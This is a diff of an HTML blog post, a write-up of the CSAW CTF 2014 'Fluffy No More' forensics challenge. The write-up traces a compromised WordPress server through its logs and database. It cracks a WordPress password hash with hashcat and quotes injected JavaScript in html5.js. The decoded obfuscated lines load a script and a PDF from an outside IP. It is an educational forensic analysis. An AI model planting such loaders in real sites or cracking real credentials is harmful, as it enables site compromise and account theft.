@@ -107,10 +107,10 @@
 	<a href="./tag/csaw.html"><i class="icon-tag"></i>CSAW</a>
 	<a href="./tag/forensics.html"><i class="icon-tag"></i>Forensics</a>
 </footer><!-- /.post-info -->                </div>
-                <p>This is the fourth and the last forensics challenge in the CSAW CTF 2014 competition. I think it was much harder than any of the three before it, but it's also much more interesting. </p>
-<p>The challenge stars with the following text:</p>
+                <p>This is the fourth and the last forensics challenge in the CSAW CTF 2014 competition. I think it was much harder than any of the three before it, but it was also much more interesting.</p>
+<p>The challenge starts with the following text:</p>
 <blockquote>
-<p>OH NO WE'VE BEEN HACKED!!!!!! -- said the Eye Heart Fluffy Bunnies Blog owner. 
+<p>OH NO WE'VE BEEN HACKED!!!!!! -- said the Eye Heart Fluffy Bunnies Blog owner.
 Life was grand for the fluff fanatic until one day the site's users started to get attacked! Apparently fluffy bunnies are not just a love of fun furry families but also furtive foreign governments. The notorious "Forgotten Freaks" hacking group was known to be targeting high powered politicians. Were the cute bunnies the next in their long list of conquests!??</p>
 <p>Well... The fluff needs your stuff. I've pulled the logs from the server for you along with a backup of it's database and configuration. Figure out what is going on!</p>
 <p>Written by brad_anton</p>
@@ -119,7 +119,7 @@ Life was grand for the fluff fanatic until one day the site's users started to g
 <p>Oh, no! Nobody should mess with fluffy bunnies! Ever! Let's find how this attack happened!</p>
 <h2>Inspecting the Directories</h2>
 <p>We start by checking the identity of the file with the command <a href="http://en.wikipedia.org/wiki/File_(command)">file</a>. We do this to make sure that the extension is not misleading:</p>
-<div class="highlight"><pre><span class="nv">$ </span>file CSAW2014-FluffyNoMore-v0.1.tar.bz2 
+<div class="highlight"><pre><span class="nv">$ </span>file CSAW2014-FluffyNoMore-v0.1.tar.bz2
 CSAW2014-FluffyNoMore-v0.1.tar.bz2: bzip2 compressed data, block <span class="nv">size</span> <span class="o">=</span> 900k
 </pre></div>
 
@@ -127,11 +127,11 @@ CSAW2014-FluffyNoMore-v0.1.tar.bz2: bzip2 compressed data, block <span class="nv
 <p>OK, cool, we can go ahead and unzip the <em>bzip2</em> (compressed) tarball:</p>
 <div class="highlight"><pre><span class="nv">$ </span>tar --help | grep bz
   -j, --bzip2                filter the archive through bzip2
-<span class="nv">$ </span>tar -xjf CSAW2014-FluffyNoMore-v0.1.tar.bz2 
+<span class="nv">$ </span>tar -xjf CSAW2014-FluffyNoMore-v0.1.tar.bz2
 </pre></div>
 
 
-<p>Now, let's take a look inside the folder:</p>
+<p>Now let's take a look inside the folder:</p>
 <div class="highlight"><pre><span class="nv">$ </span>tree CSAW2014-FluffyNoMore-v0.1
 CSAW2014-FluffyNoMore-v0.1
 ├── etc_directory.tar.bz2
@@ -143,7 +143,7 @@ CSAW2014-FluffyNoMore-v0.1
 </pre></div>
 
 
-<p>All right, 4 more tarballs. Unzip and organizing them, gives us the following directories:</p>
+<p>All right, 4 more tarballs. Unziping and organizing them give us the following directories:</p>
 <div class="highlight"><pre><span class="o">-</span> <span class="n">etc</span><span class="o">/</span>
 <span class="o">-</span> <span class="n">var</span><span class="o">/</span><span class="n">log</span> <span class="n">and</span> <span class="n">var</span><span class="o">/</span><span class="n">www</span>
 <span class="o">-</span> <span class="n">mysql_backup</span><span class="p">.</span><span class="n">sql</span> <span class="p">([</span><span class="n">MySQL</span> <span class="n">database</span> <span class="n">dump</span> <span class="n">file</span><span class="p">])</span>
@@ -152,22 +152,22 @@ CSAW2014-FluffyNoMore-v0.1
 
 <p>This is the directory structure of a  <a href="https://coderwall.com/p/syyk0g?i=5&amp;p=1&amp;q=author%3Abt3gl&amp;t%5B%5D=bt3gl">LAMP server</a>, where LAMP stands for Linux-Apache-MySQL-PHP in the <a href="http://www.tldp.org/LDP/intro-linux/html/sect_03_01.html">Linux File System</a>. In this framework, the PHP/HTML/JavaScript webpage is placed inside <code>var/www</code>.</p>
 <p>The directory <code>var/</code> contains files that are expected to change in size and content as the system is running (var stands for variable). So it is natural that system log files are generally placed at <code>/var/log</code>.</p>
-<p>Finally, the <code>etc/</code> directory contains the system configuration files. For example, the file <code>resolv.conf</code> tells the system where to go on the network to obtain host name to IP address mappings (DNS), or the file  <code>passwd</code> stores login information.</p>
+<p>Finally, the <code>etc/</code> directory contains the system configuration files. For example, the file <code>resolv.conf</code> tells the system where to go on the network to obtain host name to IP address mappings (DNS). Another example, the file  <code>passwd</code>, which stores login information.</p>
 <hr />
 <h2>Life is Made of Futile Tries</h2>
-<p>OK,  before anything, we need to give a chance:</p>
-<div class="highlight"><pre><span class="nv">$ </span>grep -r -l <span class="s2">&quot;key{&quot;</span> 
+<p>OK,  before anything, we need to give a try:</p>
+<div class="highlight"><pre><span class="nv">$ </span>grep -r -l <span class="s2">&quot;key{&quot;</span>
 var/www/html/wp-content/plugins/contact-form-7/includes/js/jquery-ui/themes/smoothness/jquery-ui.min.css
 webroot.tar.bz2-extracted/var/www/html/wp-content/plugins/contact-form-7/includes/js/jquery-ui/themes/smoothness/jquery-ui.min.css
 
-<span class="nv">$ </span>grep -r -l <span class="s2">&quot;flag{&quot;</span> 
+<span class="nv">$ </span>grep -r -l <span class="s2">&quot;flag{&quot;</span>
 var/www/html/wp-content/plugins/contact-form-7/includes/js/jquery-ui/themes/smoothness/jquery-ui.min.css
 webroot.tar.bz2-extracted/var/www/html/wp-content/plugins/contact-form-7/includes/js/jquery-ui/themes/smoothness/jquery-ui.min.css
 </pre></div>
 
 
 <p>Is our life this easy??? No, of course not. The hits we got are just funny names to mislead us, for example:</p>
-<div class="highlight"><pre> -96px}.ui-icon-home{background-position:0 -112px}.ui-icon-flag{background-position:-16px 
+<div class="highlight"><pre> -96px}.ui-icon-home{background-position:0 -112px}.ui-icon-flag{background-position:-16px
 </pre></div>
 
 
@@ -243,26 +243,32 @@ secretspace.com.    285 IN  A   72.167.232.29
 </pre></div>
 
 
-<p>The IP 72.167.232.29  leads to another generic page with no hints and with nothing in special in the sourcecode. Wrong direction...</p>
-<p>All right, let's give a last try and open the tables from the MySQL dump file inside a nice GUI. I use <a href="http://www.phpmyadmin.net/home_page/index.php">phpMyAdmin</a>, which I showed how to install and configure in my tutorial about setting up a <a href="https://coderwall.com/p/syyk0g?i=5&amp;p=1&amp;q=author%3Abt3gl&amp;t%5B%5D=bt3gl">LAMP server</a>. </p>
+<p>The IP 72.167.232.29  leads to another generic page with no hints and with nothing in special in the source code. Wrong direction...</p>
+<p>All right, let's give a last try and open the tables from the MySQL dump file inside a nice GUI. I use <a href="http://www.phpmyadmin.net/home_page/index.php">phpMyAdmin</a>, which I showed how to install and configure in my tutorial about setting up a <a href="https://coderwall.com/p/syyk0g?i=5&amp;p=1&amp;q=author%3Abt3gl&amp;t%5B%5D=bt3gl">LAMP server</a>.</p>
 <p>We open <code>localhost/phpmyadmin</code> in our browser. First we go  to <em>Databases</em> and then <em>Create Database</em> with any name we want. Then we  <em>Import</em> <code>`mysql_backup.sql</code> to this database. All the tables are loaded. Let's use the <em>Search</em> option to look for <em>key</em> or <em>flag</em>.</p>
 <p><img alt="" src="http://i.imgur.com/tVOY1VJ.png" />
 <img alt="" src="http://i.imgur.com/jY7CbLZ.png" /></p>
-<p>Nope. Nothing in special. By the way, <code>`default_pingback_flag1</code> is just a <strong>Wordpress</strong> flag indicating the default status of ping backs when new blog posts are published. </p>
-<p>Continuing our searc, if we look inside inside each of the tables we find:
-   -  The URL for the <a href="http://ww17.blog.eyeheartfluffybunnies.com">blog</a>, which doesn't render. However, in the source code, there is a commented link that leads to a <a href="http://ww17.blog.eyeheartfluffybunnies.com/?fp=Tnxj5vWdcChO2G66EhCHHqSAdskqgQmZEbVQIh1DCmrgCyQjbeNsPhkvCpIUcP19mwOmcCS1hIeFb9Aj3%2FP4fw%3D%3D&amp;prvtof=RyfmkPY5YuWnUulUghSjPRX510XSb9C0HJ2xsUn%2Fd3Q%3D&amp;poru=jcHIwHNMXYtWvhsucEK%2BtSMzUepfq46Tam%2BwGZBSFMjZiV2p3eqdw8zpPiLr76ixCoirz%2FR955vowRxEMBO%2FoQ%3D%3D&amp;cifr=1&amp;%22">cute website</a>. Nothing else.
-   - A hashed password!
+<p>Nope. Nothing in special. By the way, <code>`default_pingback_flag1</code> is just a <strong>Wordpress</strong> flag indicating the default status of ping backs when new blog posts are published.</p>
+<p>Continuing our search, if we look  inside each of the tables we find:</p>
+<ul>
+<li>
+<p>The URL for the <a href="http://ww17.blog.eyeheartfluffybunnies.com">blog</a>, which doesn't render. However, in the source code, there is a commented link that leads to a <a href="http://ww17.blog.eyeheartfluffybunnies.com/?fp=Tnxj5vWdcChO2G66EhCHHqSAdskqgQmZEbVQIh1DCmrgCyQjbeNsPhkvCpIUcP19mwOmcCS1hIeFb9Aj3%2FP4fw%3D%3D&amp;prvtof=RyfmkPY5YuWnUulUghSjPRX510XSb9C0HJ2xsUn%2Fd3Q%3D&amp;poru=jcHIwHNMXYtWvhsucEK%2BtSMzUepfq46Tam%2BwGZBSFMjZiV2p3eqdw8zpPiLr76ixCoirz%2FR955vowRxEMBO%2FoQ%3D%3D&amp;cifr=1&amp;%22">cute website</a>. Nothing else.</p>
+</li>
+<li>
+<p>A hashed password!
 <img alt="" src="http://i.imgur.com/FiQONze.png" /></p>
+</li>
+</ul>
 <hr />
 <h2>Cracking the Password</h2>
-<p>We want to unhash <code>$P$BmHbpWPZrjt.2V8T2xDJfbDrAJZ9So1</code> and for this we are going to use <a href="http://hashcat.net/hashcat/">hashcat</a>. If you are in <a href="http://www.kali.org/">Kali</a> or in any Debian distribution you can install it with:</p>
+<p>We want to crack <code>$P$BmHbpWPZrjt.2V8T2xDJfbDrAJZ9So1</code> and for this we are going to use <a href="http://hashcat.net/hashcat/">hashcat</a>. If you are in <a href="http://www.kali.org/">Kali</a> or in any Debian distribution you can install it with:</p>
 <div class="highlight"><pre><span class="nv">$ </span>apt-get hashact
 </pre></div>
 
 
 <p>In Fedora, we need to download and unzip it:</p>
 <div class="highlight"><pre><span class="nv">$ </span>wget http://hashcat.net/files/hashcat-0.47.7z
-<span class="nv">$ </span>7za e hashcat-0.47.7z 
+<span class="nv">$ </span>7za e hashcat-0.47.7z
 </pre></div>
 
 
@@ -273,7 +279,7 @@ secretspace.com.    285 IN  A   72.167.232.29
 
 <p>If this is not the case, this is an example for you (it's allways good to have several lists!):</p>
 <div class="highlight"><pre><span class="nv">$ </span>wget http://www.scovetta.com/download/500_passwords.txt
-<span class="nv">$ </span>head 500_passwords.txt 
+<span class="nv">$ </span>head 500_passwords.txt
 123456
 password
 12345678
@@ -311,7 +317,7 @@ mustang
 
 
 <p>We choose 400 because we are dealing with Wordpress. We copy and paste the hash to a file <em>pass.hash</em>. Then, we run:</p>
-<div class="highlight"><pre><span class="nv">$ </span>./hashcat-cli64.bin -m 400 -a 0 -o cracked.txt --remove  pass.hash word_list.txt 
+<div class="highlight"><pre><span class="nv">$ </span>./hashcat-cli64.bin -m 400 -a 0 -o cracked.txt --remove  pass.hash word_list.txt
 
 Initializing hashcat v0.47 by atom with 8 threads and 32mb segment-size...
 
@@ -339,23 +345,39 @@ Stopped: Thu Sep 25 18:25:50 2014
 <p>where:</p>
 <ul>
 <li>-m is for --hash-type=NUM</li>
-<li>-a 0: Using a dictionary attack </li>
+<li>-a 0: Using a dictionary attack</li>
 <li>cracked.txt is the output file</li>
 <li>word_list.txt is our dictionary</li>
 </ul>
 <p>Now let's take a peak in the output file:</p>
-<div class="highlight"><pre><span class="nv">$ </span>cat cracked.txt 
+<div class="highlight"><pre><span class="nv">$ </span>cat cracked.txt
 <span class="nv">$P$BmHbpWPZrjt</span>.2V8T2xDJfbDrAJZ9So1:fluffybunnies
 </pre></div>
 
 
 <p>It worked! Our password is <strong>fluffybunnies</strong>!</p>
-<p>All right, this is a very silly password! It could be easy guessed. If you were the attacker, wouldn't you try this as the first option ? OK, maybe right after <em>password</em> and <em>123456</em>...</p>
+<p>All right, this is a very silly password! It could be easily guessed. If you were the attacker, wouldn't you try this as the first option? OK, maybe right after <em>password</em> and <em>123456</em>... :)</p>
 <h4>What we have so far</h4>
-<p>In conclusion, all we have learned from this file was  the attacker's motivation, the blog's URL, that the application was in Wordpress, and a password. Ah,  also that <code>mailserver_login:login@example.com</code> and <code>mailserver_pass=password</code>. Talking about security... Let's move on.</p>
+<p>All we have learned from this file was:</p>
+<ul>
+<li>
+<p>the attacker's motivation,</p>
+</li>
+<li>
+<p>the blog's URL,</p>
+</li>
+<li>
+<p>that the application was in Wordpress,</p>
+</li>
+<li>
+<p>and a password.</p>
+</li>
+</ul>
+<p>Ah,  also that <code>mailserver_login:login@example.com</code> and <code>mailserver_pass=password</code>. Talking about security...</p>
+<p>Let's move on.</p>
 <hr />
 <h2>Inspecting /var/logs/apache2</h2>
-<p>The next item in the list is log inspection:</p>
+<p>The next item in the list is log inspection. We need to choose it wisely, there are many of them:</p>
 <div class="highlight"><pre><span class="nv">$ </span>find . -type f  -name <span class="s1">&#39;*.log&#39;</span>
 ./apache2/error.log
 ./apache2/access.log
@@ -392,23 +414,31 @@ Stopped: Thu Sep 25 18:25:50 2014
 </pre></div>
 
 
-<p>If there is any important information in the log files, it should appears in the end of it, because the attack should be one of the last things that were logged. <a href="http://en.wikipedia.org/wiki/Tail_(Unix)">Tailing</a> the <em>apache</em> logs did not reveal anything useful. Maybe it is interesting to know that we see the IP <em>192.168.127.137</em> in the file <em>/apache2/access.log</em>, which belongs to <em>MASTER OF DISASTER</em> (see above). So <em>hacker</em> was not the attacker?</p>
+<p>If there is any important information in the log files, it should appears in the end, because the attack should be one of the last things that were logged.</p>
+<p><a href="http://en.wikipedia.org/wiki/Tail_(Unix)">Tailing</a> the <em>apache</em> logs did not reveal anything useful. Maybe it is interesting to know that we see the IP <em>192.168.127.137</em> in the file <em>/apache2/access.log</em>, which belongs to <em>MASTER OF DISASTER</em> (see above). So <em>hacker</em> was not the attacker?</p>
 <hr />
 <h2>Inspecting var/logs/auth.log</h2>
-<p>Now, considering that the password <strong>fluffybunnies</strong> was very easy to guess, we are going to take a leap and suppose that this was how the attack was crafted. Tailing <code>auth.log</code> shows something interesting:</p>
+<p>Now, considering that the password <strong>fluffybunnies</strong> was very easy to guess, we are going to take a leap and suppose that this was how the attack was crafted.</p>
+<p>Tailing <code>auth.log</code> shows something interesting:</p>
 <div class="highlight"><pre>Sep 17 19:18:53 ubuntu sudo:   ubuntu : <span class="nv">TTY</span><span class="o">=</span>pts/0 ; <span class="nv">PWD</span><span class="o">=</span>/home/ubuntu/CSAW2014-WordPress/var/www ; <span class="nv">USER</span><span class="o">=</span>root ; <span class="nv">COMMAND</span><span class="o">=</span>/bin/chmod -R 775 /var/www/
 Sep 17 19:20:09 ubuntu sudo:   ubuntu : <span class="nv">TTY</span><span class="o">=</span>pts/0 ; <span class="nv">PWD</span><span class="o">=</span>/home/ubuntu/CSAW2014-WordPress/var/www ; <span class="nv">USER</span><span class="o">=</span>root ; <span class="nv">COMMAND</span><span class="o">=</span>/usr/bin/vi /var/www/html/wp-content/themes/twentythirteen/js/html5.js
 Sep 17 19:20:55 ubuntu sudo:   ubuntu : <span class="nv">TTY</span><span class="o">=</span>pts/0 ; <span class="nv">PWD</span><span class="o">=</span>/home/ubuntu/CSAW2014-WordPress/var/www ; <span class="nv">USER</span><span class="o">=</span>root ; <span class="nv">COMMAND</span><span class="o">=</span>/usr/bin/find /var/www/html/ * touch <span class="o">{}</span>
 </pre></div>
 
 
-<p>So someone logged as root and:
- 1. downgraded the permissions of <em>/var/www</em> (755 means read and execute access for everyone and also write access for the owner of the file), and
- 2. modified a JavaScript file (html5.js) in <em>vi</em>.</p>
+<p>So someone logged as root:</p>
+<ol>
+<li>
+<p>downgraded the permissions of <em>/var/www</em> (755 means read and execute access for everyone and also write access for the owner of the file), and</p>
+</li>
+<li>
+<p>modified a JavaScript file (html5.js) in <em>vi</em>.</p>
+</li>
+</ol>
 <hr />
 <h2>Finding the JavaScript Exploit</h2>
 <p>It looks like an attack to me! Let's <a href="http://linux.die.net/man/1/diff">diff</a> this JavaScript file with the original (<a href="http://phpxref.ftwr.co.uk/wordpress/wp-content/themes/twentythirteen/js/html5.js.source.html">which we can just google</a>):</p>
-<div class="highlight"><pre><span class="nv">$ </span>diff html5.js html5_normal.js 
+<div class="highlight"><pre><span class="nv">$ </span>diff html5.js html5_normal.js
 93,122d92
 &lt; var <span class="nv">g</span> <span class="o">=</span> <span class="s2">&quot;ti&quot;</span>;
 &lt; var <span class="nv">c</span> <span class="o">=</span> <span class="s2">&quot;HTML Tags&quot;</span>;
@@ -444,8 +474,10 @@ Sep 17 19:20:55 ubuntu sudo:   ubuntu : <span class="nv">TTY</span><span class="
 
 
 <p>Aha!!! So what is being written?</p>
-<p>In JavaScript, the function <code>document.write()</code> writes HTML expressions or JavaScript code to a document. However, we can debug it in the console if we want, changing it to <code>console.log()</code> (and changing any <code>document</code> word to <code>console</code>). To run JavaScript in the console, you need to install <a href="http://nodejs.org/">Node</a>:</p>
-<div class="highlight"><pre><span class="nv">$ </span>node html5.js 
+<p>In JavaScript, the function <code>document.write()</code> writes HTML expressions or JavaScript code to a document. However, we can debug it in the console if we want, changing it to <code>console.log()</code> (and changing any <code>document</code> word to <code>console</code>).</p>
+<p>To run JavaScript in the console, you need to install <a href="http://nodejs.org/">Node</a>.</p>
+<p>So we run and we get a URL:</p>
+<div class="highlight"><pre><span class="nv">$ </span>node html5.js
 &lt;script <span class="nv">src</span><span class="o">=</span><span class="s1">&#39;http://128.238.66.100/analytics.js&#39;</span>&gt;&lt;/script&gt;
 </pre></div>
 
@@ -460,28 +492,29 @@ HTTP request sent, awaiting response... 200 OK
 Length: 16072 <span class="o">(</span>16K<span class="o">)</span> <span class="o">[</span>application/javascript<span class="o">]</span>
 Saving to: ‘analytics.js’
 
-100%<span class="o">[===============================================================================</span>&gt;<span class="o">]</span> 16,072      --.-K/s   in 0.008s  
+100%<span class="o">[===============================================================================</span>&gt;<span class="o">]</span> 16,072      --.-K/s   in 0.008s
 
 2014-09-25 19:17:19 <span class="o">(</span>2.02 MB/s<span class="o">)</span> - ‘analytics.js’ saved <span class="o">[</span>16072/16072<span class="o">]</span>
 </pre></div>
 
 
-<p>The file turns out to be large, and <em>grep</em> <em>flag</em> or <em>key</em> doesn't give any result back. No IP addresses or URL neither. </p>
-<p>OK, let's take a closer look at it. We open the file in a text editor and we found a weird hex-encoded variable that is completely unconnected from the rest:</p>
+<p>The file turns out to be large, and <em>grep</em> <em>flag</em> or <em>key</em> doesn't show any hit. No IP addresses or URL neither.</p>
+<p>OK, let's take a closer look. We open the file in a text editor and we find a weird hex-encoded variable that is completely unconnected from the rest:</p>
 <div class="highlight"><pre><span class="n">var</span> <span class="n">_0x91fe</span> <span class="o">=</span> <span class="p">[</span><span class="s">&quot;</span><span class="se">\x68\x74\x74\x70\x3A\x2F\x2F\x31\x32\x38\x2E\x32\x33\x38\x2E\x36\x36\x2E\x31\x30\x30\x2F\x61\x6E\x6E\x6F\x75\x6E\x63\x65\x6D\x65\x6E\x74\x2E\x70\x64\x66</span><span class="s">&quot;</span><span class="p">,</span> <span class="s">&quot;</span><span class="se">\x5F\x73\x65\x6C\x66</span><span class="s">&quot;</span><span class="p">,</span> <span class="s">&quot;</span><span class="se">\x6F\x70\x65\x6E</span><span class="s">&quot;</span><span class="p">];</span>
 <span class="n">window</span><span class="p">[</span><span class="n">_0x91fe</span><span class="p">[</span><span class="mi">2</span><span class="p">]](</span><span class="n">_0x91fe</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">_0x91fe</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
 </pre></div>
 
 
-<p>We decode it using Python or a <a href="http://ddecode.com/hexdecoder/">online hex-decode</a>:</p>
+<p>We decode it using Python or a <a href="http://ddecode.com/hexdecoder/">online hex-decode</a> and we get another file:</p>
 <div class="highlight"><pre><span class="o">&gt;&gt;&gt;</span> <span class="k">print</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\x68\x74\x74\x70\x3A\x2F\x2F\x31\x32\x38\x2E\x32\x33\x38\x2E\x36\x36\x2E\x31\x30\x30\x2F\x61\x6E\x6E\x6F\x75\x6E\x63\x65\x6D\x65\x6E\x74\x2E\x70\x64\x66</span><span class="s">&quot;</span><span class="p">,</span> <span class="s">&quot;</span><span class="se">\x5F\x73\x65\x6C\x66</span><span class="s">&quot;</span><span class="p">,</span> <span class="s">&quot;</span><span class="se">\x6F\x70\x65\x6E</span><span class="s">&quot;</span><span class="p">)</span>
 <span class="p">(</span><span class="s">&#39;http://128.238.66.100/announcement.pdf&#39;</span><span class="p">,</span> <span class="s">&#39;_self&#39;</span><span class="p">,</span> <span class="s">&#39;open&#39;</span><span class="p">)</span>
 </pre></div>
 
 
-<p>OK, another file. Opening the URL leads to this picture:
+<p>Opening the URL leads to this picture:
 <img alt="" src="http://i.imgur.com/CNEQhfG.png" /></p>
-<p>No flag yet... But it should be in the PDF somewhere!</p>
+<p>LOL. Funny, but no flag yet...</p>
+<p>It should be in the PDF somewhere!</p>
 <hr />
 <h2>Finding the Second Hex-encoded String: Approach I</h2>
 <p>All right, let's use what we learned from the <a href="https://gist.github.com/bt3gl/4574e99fe0f0dbdb56a9">CSAW CTF 2014 Forensic -Obscurity</a> problem. First, let's see if we find the flag with a simple grep:</p>
@@ -534,10 +567,10 @@ Indirect object: 9
 
 
 <p>Nice. So now we can decode our pdf file using the <strong>object code</strong>, which we can see  above that is <strong>8</strong>:</p>
-<div class="highlight"><pre><span class="nv">$ </span>./pdf-parser.py --object 8 --raw --filter announcement.pdf 
+<div class="highlight"><pre><span class="nv">$ </span>./pdf-parser.py --object 8 --raw --filter announcement.pdf
 obj 8 0
  Type: /EmbeddedFile
- Referencing: 
+ Referencing:
  Contains stream
 
   &lt;&lt;
@@ -575,12 +608,13 @@ obj 8 0
 
 
 <p>Opening <em>unpacket.pdf</em> with <a href="http://tarot.freeshell.org/leafpad/">l3afpad</a> also leads to the flag :</p>
-<p>```
-stream
-var _0xee0b=["\x59\x4F\x55\x20\x44\x49\x44\x20\x49\x54\x21\x20\x43\x4F\x4E\x47\x52\x41\x54\x53\x21\x20\x66\x77\x69\x77\x2C\x20\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x20\x6F\x62\x66\x75\x73\x63\x61\x74\x69\x6F\x6E\x20\x69\x73\x20\x73\x6F\x66\x61\x20\x6B\x69\x6E\x67\x20\x64\x75\x6D\x62\x20\x20\x3A\x29\x20\x6B\x65\x79\x7B\x54\x68\x6F\x73\x65\x20\x46\x6C\x75\x66\x66\x79\x20\x42\x75\x6E\x6E\x69\x65\x73\x20\x4D\x61\x6B\x65\x20\x54\x75\x6D\x6D\x79\x20\x42\x75\x6D\x70\x79\x7D"];var y=_0xee0b[0];
-endstream
-endobj
-````</p>
+<div class="highlight"><pre><span class="n">stream</span>
+<span class="n">var</span> <span class="n">_0xee0b</span><span class="o">=</span><span class="p">[</span><span class="s">&quot;</span><span class="se">\x59\x4F\x55\x20\x44\x49\x44\x20\x49\x54\x21\x20\x43\x4F\x4E\x47\x52\x41\x54\x53\x21\x20\x66\x77\x69\x77\x2C\x20\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x20\x6F\x62\x66\x75\x73\x63\x61\x74\x69\x6F\x6E\x20\x69\x73\x20\x73\x6F\x66\x61\x20\x6B\x69\x6E\x67\x20\x64\x75\x6D\x62\x20\x20\x3A\x29\x20\x6B\x65\x79\x7B\x54\x68\x6F\x73\x65\x20\x46\x6C\x75\x66\x66\x79\x20\x42\x75\x6E\x6E\x69\x65\x73\x20\x4D\x61\x6B\x65\x20\x54\x75\x6D\x6D\x79\x20\x42\x75\x6D\x70\x79\x7D</span><span class="s">&quot;</span><span class="p">];</span><span class="n">var</span> <span class="n">y</span><span class="o">=</span><span class="n">_0xee0b</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
+<span class="n">endstream</span>
+<span class="n">endobj</span>
+</pre></div>
+
+
 <hr />
 <p><strong>That's it! Hack all the things!</strong></p>
                 </div><!-- /.entry-content -->
@@ -603,14 +637,14 @@ endobj
 <br>
 
 <li class="nav-header"><h4>Tags</h4></li>
-<li class="tag-4">
-    <a href="./tag/reverse-engineering.html">
-        <i class="icon-tag icon-large"></i>Reverse Engineering
-    </a>
-</li>
 <li class="tag-1">
     <a href="./tag/ctf.html">
         <i class="icon-tag icon-large"></i>CTF
+    </a>
+</li>
+<li class="tag-4">
+    <a href="./tag/reverse-engineering.html">
+        <i class="icon-tag icon-large"></i>Reverse Engineering
     </a>
 </li>
 <li class="tag-2">
@@ -623,6 +657,11 @@ endobj
         <i class="icon-tag icon-large"></i>Steganography
     </a>
 </li>
+<li class="tag-1">
+    <a href="./tag/csaw.html">
+        <i class="icon-tag icon-large"></i>CSAW
+    </a>
+</li>
 <li class="tag-4">
     <a href="./tag/networking.html">
         <i class="icon-tag icon-large"></i>Networking
@@ -631,11 +670,6 @@ endobj
 <li class="tag-4">
     <a href="./tag/cryptography.html">
         <i class="icon-tag icon-large"></i>Cryptography
-    </a>
-</li>
-<li class="tag-1">
-    <a href="./tag/csaw.html">
-        <i class="icon-tag icon-large"></i>CSAW
     </a>
 </li>
 
